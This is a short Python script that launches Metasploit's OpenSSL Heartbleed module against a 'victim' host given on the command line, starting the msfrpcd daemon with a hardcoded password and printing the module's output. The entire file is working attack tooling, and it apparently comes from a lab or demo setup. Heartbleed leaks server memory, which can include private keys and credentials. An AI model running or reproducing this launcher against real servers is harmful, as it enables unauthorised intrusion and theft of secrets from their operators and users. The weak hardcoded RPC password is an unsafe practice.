import sys
import os
from pymetasploit3.msfrpc import MsfRpcClient
import time


os.system("./msfrpcd -P password -S")

victim = sys.argv[1]

print("INITIALIZING EXPLOIT")

while True:
    try:
        client = MsfRpcClient('password', port=55553, ssl=False)
        print("CONNECTED TO MSFRPC")
        break
    except:
        time.sleep(1)

exploit = client.modules.use('auxiliary', 'scanner/ssl/openssl_heartbleed')
exploit['RHOSTS'] = victim

cid = client.consoles.console().cid

sys.stdin.readline()
print(client.consoles.console(cid).run_module_with_output(exploit))

while True:
    time.sleep(1)
